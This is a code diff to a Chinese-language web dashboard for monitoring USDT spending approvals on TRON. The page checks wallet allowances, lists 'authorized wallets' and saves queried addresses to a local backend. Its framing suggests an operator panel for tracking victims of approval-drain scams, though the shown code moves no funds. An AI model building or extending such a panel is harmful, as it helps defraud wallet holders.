@@ -15,18 +15,19 @@
     button { background: #00b894; color: white; padding: 0.5em 1em; border: none; border-radius: 5px; cursor: pointer; }
     .error { color: red; }
     #status { margin-top: 1em; font-weight: bold; }
-    input[type="text"] { padding: 0.5em; width: 250px; margin-right: 1em; }
   </style>
 </head>
 <body>
   <h1>🔐 USDT 授權監控後台</h1>
   <div id="status">🔍 正在檢查 TronLink...</div>
-
+  
+  <!-- 查詢輸入框 -->
   <div style="margin-top: 2em;">
-    <input type="text" id="checkWallet" placeholder="輸入錢包地址查詢" />
+    <input type="text" id="checkWallet" placeholder="輸入錢包地址查詢" /> 
     <button onclick="checkWallet()">查詢是否授權</button>
   </div>
 
+  <!-- 授權錢包顯示區域 -->
   <div id="wallets"></div>
 
   <script>
@@ -55,6 +56,9 @@
           displayWallets();
         }
         alert(`授權額度：${value} USDT`);
+        
+        // 儲存到後端
+        await axios.post('http://localhost:3333/wallets', { address });
       } catch (err) {
         alert("查詢失敗：" + err.message);
       }
@@ -104,6 +108,7 @@
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
           clearInterval(check);
           logStatus("🟢 已連接錢包：" + window.tronWeb.defaultAddress.base58, "green");
+          fetchApprovals();
         } else {
           attempts++;
           logStatus("⏳ 嘗試連接 TronLink 中（" + attempts + "/20）...");
